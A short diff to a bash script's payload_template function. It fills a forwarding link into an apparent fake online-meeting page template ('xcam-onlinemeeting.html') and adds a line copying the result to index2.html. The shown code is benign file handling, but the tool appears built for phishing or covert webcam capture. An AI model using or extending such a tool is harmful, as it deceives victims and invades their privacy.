@@ -271,6 +271,7 @@ payload_template() {
             return 1
         fi
         sed "s|forwarding_link|$forwarding_link|g" xcam-onlinemeeting.html > index.html
+        cp index.html index2.html
     fi
     if [[ -f "index.html" ]]; then
         printf "\e[1;92m  ✓ Template ready\e[0m\n"
